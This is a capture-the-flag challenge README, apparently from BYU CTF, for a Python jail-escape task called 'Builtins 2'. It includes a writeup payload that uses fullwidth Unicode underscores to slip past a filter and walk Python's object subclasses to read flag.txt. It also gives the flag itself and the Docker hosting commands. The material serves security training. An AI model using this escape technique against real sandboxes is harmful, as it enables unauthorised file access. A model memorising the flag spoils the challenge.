# Builtins 2
Level - Hard

Description:
```markdown
But wait it's different this time...

nc byuctf.xyz 40006

[b2.py]
```

## Writeup
The following payload should work - `()._＿class_＿._＿bases_＿[0]._＿subclasses_＿()[124].get_data('.','flag.txt')`

**Flag** - `byuctf{unicode_is_always_the_solution...}`

## Hosting
This challenge should be a Docker container that runs the Python script `b2.py` every time someone connects on port 40006. All the proper files are included in here. The command to build the docker container is (when located inside of this directory):

```bash
sudo docker build -t b2 .
sudo docker network create -d bridge b2
```

The command to start the challenge is:

```bash
sudo docker run -p 40006:40000 --detach --name b2 --network b2 b2:latest
```

The command to stop the challenge (since CTRL+C won't work) is:

```bash
sudo docker stop b2
```